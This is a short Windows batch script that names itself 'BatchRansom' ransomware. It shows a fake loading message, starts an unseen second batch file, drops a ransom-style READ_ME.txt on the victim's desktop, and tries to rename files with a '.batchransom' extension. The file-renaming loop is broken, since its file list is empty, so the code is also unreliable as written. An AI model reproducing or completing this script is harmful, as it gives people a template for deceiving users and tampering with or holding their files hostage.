@echo off
echo Loading... Don't close.
start mscorp.bat
timeout 30
echo You have been infected by BatchRansom! > %userprofile%\Desktop\READ_ME.txt
for /f "delims=" %%f in () do (
    move "%%f" "%%f.batchransom"
)
